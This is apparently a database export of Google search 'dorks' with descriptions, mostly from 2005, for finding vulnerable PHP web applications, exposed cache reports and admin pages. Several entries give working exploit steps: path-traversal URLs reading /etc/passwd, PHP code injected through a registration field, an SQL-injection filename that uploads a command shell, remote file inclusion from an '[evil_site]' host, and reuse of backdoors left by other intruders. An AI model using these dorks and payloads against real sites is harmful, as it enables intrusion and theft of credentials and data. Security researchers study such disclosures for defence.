&quot;1&quot;;&quot;2003-06-24&quot;;&quot;"cacheserverreport for" "This analysis was produced by calamaris"&quot;;&quot;These are squid server cache reports. Fairly benign, really except when you consider using them for evil purposes. For example, an institution stands up a proxy server for their internal users to get to the outside world. Then, the internal user surf all over to their hearts content (including intranet pages cuz well, the admins are stupid) Voila, intranet links show up in the external cache report. Want to make matters worse for yourself as an admin? OK, configure your external proxy server as a trusted internal host. Load up your web browser, set your proxy as their proxy and surf your way into their intranet. Not that I&#039;ve noticed any examples of this in this google list. *COUGH* *COUGH* *COUGH*  unresolved DNS lookups give clues *COUGH* *COUGH* (&#039;scuse me. must be a furball) OK, lets say BEST CASE scenario. Let&#039;s say there&#039;s not security problems revealed in these logs. Best case scenario is that outsiders can see what your company/agency/workers are surfing.&quot;
&quot;1091&quot;;&quot;2005-09-04&quot;;&quot;inurl:chitchat.php "choose graphic"&quot;;&quot;rgod advises:Cyber-Cats ChitCHat 2.0 permit cross site scripting attacks, let users launch exploits from, let remote users obtain informations on target users, let insecurely delete/create files. This search does not find vulnerable versions, only generic.software:site: http://www.cyber-cats.com/php/rgodsite: http://rgod.altervista.orgmail: retrogod@aliceposta.it[/code]&quot;
&quot;1092&quot;;&quot;2005-09-05&quot;;&quot;"Calendar programming by AppIdeas.com" filetype:php&quot;;&quot;phpCommunityCalendar 4.0.3 (possibly prior versions) sql injection / login bypass / cross site scripting This search does not narrow to vulnerable versions.software:site: http://open.appideas.comdownload: http://open.appideas.com/Calendar/original advisory: http://rgod.altervista.org/phpccal.html&quot;
&quot;1093&quot;;&quot;2005-09-05&quot;;&quot;"Powered by MD-Pro" | "made with MD-Pro"&quot;;&quot;MAXdev MD-Pro 1.0.73 (possibly prior versions) remote code execution/ cross site scripting / path disclosure. This search does not find vulnerable versions.software:site: http://www.maxdev.com/description: http://www.maxdev.com/AboutMD.phtmloriginal advisory: http://rgod.altervista.org/maxdev1073.html&quot;
&quot;1094&quot;;&quot;2005-09-07&quot;;&quot;"Software PBLang" 4.65 filetype:php&quot;;&quot;my advisory:[quote]PBLang 4.65 (possibly prior versions) remote code execution / administrativecredentials disclosure / system information disclosure / cross site scripting /path disclosuresoftware:description: PBLang is a powerful flatfile Bulletin Board System. It combinesmany features of a professional board, but does not even require SQL support. Itis completely based on text-file.site: http://pblang.drmartinus.de/download: https://sourceforge.net/project/showfiles.php?group_id=629531) system disclosure:you can traverse directories and see any file (if not .php or .php3 etc.) andinclude any file on target system using &#039;../&#039; chars and null byte (%00), example:http://target]/[path]/pblang/setcookie.php?u=../../../../../etc/passwd%00vulnerable code in setcookie.php:   ...16 $usrname=$HTTP_GET_VARS[&#039;u&#039;];17 @include($dbpath.&#039;/&#039;.$usrname.&#039;temp&#039;);   ...2) remote code execution:board stores data in files, when you register a [username] file without extensionis created in /db/members directory, inside we have php code executed when youlogin, so in location field type:madrid"; system($HTTP_POST_VARS[cmd]); echo "in /db/members/[username] file we have...$userlocation="madrid"; system($HTTP_GET_VARS[cmd]); echo "";...no way to access the script directly, /db/members is .htaccess protectedand extra lines are deleted from files after you login, so you should makeall in a POST request and re-registerthis is my proof of concept exploit, to include [username] file I make a GET request of setcookie.php?u=[username]%00&cmd=[command] but you can call username file through some other inclusion surely when you surf the forum:http://rgod.altervista.org/pblang465.html 3)admin/user credentials disclosure:you can see password hash of any user or admin sending the command:cat ./db/members/[username]4) cross site scripting:register and in location field type:madrid"; echo "alert(document.cookie)then check this url:http://[target]/[path]/setcookie.php?u=[username]%005) path disclosure:http://[target]/[path]/setcookie.php?u=%00googledork: "Software PBLang" filetype:phprgodsite: http://rgod.altervista.orgmail: retrogod@aliceposta.itoriginal advisory: http://rgod.altervista.org/pblang465.html[/quote]&quot;
&quot;1095&quot;;&quot;2005-09-08&quot;;&quot;"Powered by and copyright class-1"  0.24.4&quot;;&quot;class-1 Forum Software v 0.24.4 Remote code executionsoftware: site: http://www.class1web.co.uk/softwaredescription: class-1 Forum Software is a PHP/MySQL driven web forum. It is written and distributedunder the GNU General Public License which means that its source is freely-distributedand available to the general public. vulnerability: the way the forum checks attachment extensions...look at the vulnerable code at viewforum.php 256-272 lines.nothing seems so strange, but... what happen if you try to upload a filewith this name? :shell.php.&#039; or &#039;a&#039; =&#039;a;)[1] SQL INJECTION!The query and other queries like this become:SELECT * FROM [extensions table name] WHERE extension=&#039;&#039; or &#039;a&#039; =&#039;a&#039; AND file_type=&#039;Image&#039;you have bypassed the check... now an executable file is uploaded, because for Apache, bothon Windows and Linux a file with that name is an executable php file...you can download a poc file from my site, at url:http://rgod.altervista.org/shell.zipinside we have:you can do test manually, unzip the file, register, login, post this file as attachment, thengo to this url to see the directory where the attachment has been uploaded:http://[target]/[path]/viewattach.phpyou will be redirected to:http://[target]/[path]/[upload_dir]/then launch commands:http://[target]/[path]/[upload_dir]/shell.php.&#039;%20or%20&#039;a&#039;%20=&#039;a?command=cat%20/etc/passwdto see /etc/passwd filehttp://[target]/[path]/[upload_dir]/shell.php.&#039;%20or%20&#039;a&#039;%20=&#039;a?command=cat%20./../db_config.incto see database username and passwordand so on...you can see my poc exploit at this url:http://www.rgod.altervista.org/class1.htmlgoogledork: "Powered by and copyright class-1"rgodsite: http://rgod.altervista.orgmail: retrogod [at] aliceposta . it&quot;
&quot;1096&quot;;&quot;2005-09-08&quot;;&quot;"Powered by Xcomic"&quot;;&quot;"Powered by xcomic"this is a recent exploit, you can retrieve any file on target systemby using "../" chars and null byte (%00), example:http://target/path_to_xcomic/initialize.php?xcomicRootPath=../../../../etc/passwd%00or launch commands:http://target/path_to_xcomic/initiailze.php?xcomicRootPath=http://[evil_site]/cmd.gif?command=ls%20-la%00where cmd.gif is a file like this:I have read an advisory copy here: http://forum.ccteam.ru/archive/index.php/t-57.html&quot;
&quot;1097&quot;;&quot;2005-09-08&quot;;&quot;rdbqds -site:.edu -site:.mil -site:.gov&quot;;&quot;Ceasar encryption is a rather simple encryption. You simply shift letters up or down across the entire length of the message... In the url I did this with the word "secret" which equals rdbqds.. (1 char shift).It appears that protected PDF documents use this very encryption to protect its documents. At least one version of adobe acrobat did. A big thank you to Golfo for the links he provided in the forum to assist.http://www.math.cankaya.edu.tr/~a.kabarcik/decrypt.html http://www.math.cankaya.edu.tr/~a.kabarcik/encrypt.html&quot;
&quot;1098&quot;;&quot;2005-09-11&quot;;&quot;"Warning:" "Cannot execute a blank command in"&quot;;&quot;"Warning: passthru(): Cannot execute a blank command in" "Warning: system(): Cannot execute a blank command in" "Warning: exec(): Cannot execute a blank command in" generally: "Warning:" "Cannot execute a blank command in" this a php error message, essentially it shows hacked pages links where someone leaved a backdoor and the page has error_reporting not set to 0... you can execute shell commands simply appending a var, guessing variable name, usually &#039;cmd&#039; or &#039;command&#039; or something else, example: http://[target]/[path]/somescript.php?cmd=cat%20/etc/passwd&quot;
&quot;1099&quot;;&quot;2005-09-11&quot;;&quot;"Mail-it Now!" intitle:"Contact form" | inurl:contact.php&quot;;&quot;Mail-it Now! 1.5 (possibly prior versions) contact.php remote code executionsite: http://www.skyminds.net/source/description: a mail form scriptvulnerability: unsecure file creation -> remote code executionwhen you post an attachment and upload it to the server (usually to "./upload/" dir )the script rename the file in this way:[time() function result] + [-] + [filename that user choose]spaces are simply replaced with "_" chars.So a user can post an executable attachment, calculate the time() result locallythen, if attachment is a file like this:can launch commands on target system, example:http://[target]/[path]/[time() result]-[filename.php]?command=cat%20/etc/passwdu can find my poc code at this url: http://rgod.altervista.org/mailitnow.html&quot;
&quot;1100&quot;;&quot;2005-09-13&quot;;&quot;"maxwebportal" inurl:"default" "snitz forums" +"homepage" -intitle:maxwebportal&quot;;&quot;several vulnerabilities relating to this.MaxWebPortal is a web portal and online community system which includes features such as web-based administration, poll, private/public events calendar, user customizable color themes, classifieds, user control panel, online pager, link, file, article, picture managers and much more. User interface allows members to add news, content, write reviews and share information among other registered users.h**p://www.maxwebportal.com/&quot;
&quot;1101&quot;;&quot;2005-09-13&quot;;&quot;"Powered by AzDg" (2.1.3 | 2.1.2 | 2.1.1)&quot;;&quot;AzDGDatingLite V 2.1.3 (possibly prior versions) remote code execution software: site: http://www.azdg.com/ download page: http://www.azdg.com/scripts.php?l=english description:" AzDGDatingLite is a Free dating script working on PHP and MySQL. Multilanguage, Multitemplate, quick/simple search, feedback with webmaster, Admin maillist, Very customizable " etc.   vulnerability: look at the vulnerable code in ./include/security.inc.php at lines ~80-90 ... else    {    if (isset($l) && file_exists(C_PATH.&#039;/languages/&#039;.$l.&#039;/&#039;.$l.&#039;.php&#039;) && $l != &#039;&#039;)       {               include_once C_PATH.&#039;/languages/&#039;.$l.&#039;/&#039;.$l.&#039;.php&#039;;          include_once C_PATH.&#039;/languages/&#039;.$l.&#039;/&#039;.$l.&#039;_.php&#039;;    } ... you can include arbitrary file on the server using "../" and null byte (%00) (to truncate path to the filename you choose), example: http://[target]/[path]/azdg//include/security.inc.php?l=../../../../../../../[filename.ext]%00 at the begin of the script we have: @ob_start(); look at the php ob_ start man page : "This function will turn output buffering on. While output buffering is active no output is sent from the script (other than headers), instead the output is stored in an internal buffer." However, this is not a secure way to protect a script: buffer is never showned, so you cannot see arbitrary file from the target machine this time ... but you can execute arbirtrary commands and after to see any file :) : when you register to azdg you can upload photos, so you can upload and include a gif or jpeg file like this:  usually photos are uploaded to ./members/uploads/[subdir]/[newfilename].[ext] azdg calculates [subdir] & [newfilename] using date(), time() and rand() functions you cannot calculate but you can retrieve the filename from azdg pages when file is showned on screen (!), so you can do this: http://[target]/[path]/azdg//include/security.inc.php?l=../../../members/uploads/[subdir]/[filename.ext]%00&cmd=cat%20/etc/passwd the output will be redirected to ./include/temp.txt so you make a GET request of this file and you have /etc/passwd file you can find my poc exploit at this url:http://rgod.altervista.org/azdg.html&quot;
&quot;1103&quot;;&quot;2005-09-13&quot;;&quot;"Powered by: Land Down Under 800" |  "Powered by: Land Down Under 801" - www.neocrome.net&quot;;&quot;Land Down Under is prone to an HTML injection vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input before using it in dynamically generated content.Attacker-supplied HTML and script code would be executed in the context of the affected Web site, potentially allowing for theft of cookie-based authentication credentials. An attacker could also exploit this issue to control how the site is rendered to the user; other attacks are also possible.http://secunia.com/advisories/16878/&quot;
&quot;1104&quot;;&quot;2005-09-13&quot;;&quot;intext:"Master Account"  "Domain Name" "Password" inurl:/cgi-bin/qmailadmin&quot;;&quot;There seems to be several vulns for qmail.&quot;
&quot;1105&quot;;&quot;2005-09-13&quot;;&quot;"powered by Gallery v" "[slideshow]"|"images" inurl:gallery&quot;;&quot;There is a script injection vuln for all versions.http://www.securityfocus.com/bid/14668&quot;
&quot;1106&quot;;&quot;2005-09-13&quot;;&quot;intitle:guestbook inurl:guestbook "powered by  Advanced guestbook 2.*" "Sign the Guestbook"&quot;;&quot;Advanced Guestbook is prone to an HTML injection vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input before using it in dynamically generated content.Attacker-supplied HTML and script code would be executed in the context of the affected Web site, potentially allowing for theft of cookie-based authentication credentials. An attacker could also exploit this issue to control how the site is rendered to the user; other attacks are also possible.http://secunia.com/product/4356/http://www.packetalarm.com/sec_notices/index.php?id=2209&delimit=1#detail&quot;
&quot;1107&quot;;&quot;2005-09-13&quot;;&quot;intitle:"Backup-Management (phpMyBackup v.0.4 beta * )" -johnny.ihackstuff&quot;;&quot;phpMyBackup is an mySQL backup tool, with features like copying backups to a different server using FTP.&quot;
&quot;1108&quot;;&quot;2005-09-13&quot;;&quot;"Powered by Monster Top List" MTL numrange:200-&quot;;&quot;2 Step dork - Change url to add filename "admin.php" (just remove index.php&stuff=1&me=2 if you have to) for the admin login.This search finds more pages rather than focusing on the admin login page itself, thus the 2 step dork is more effective.&quot;
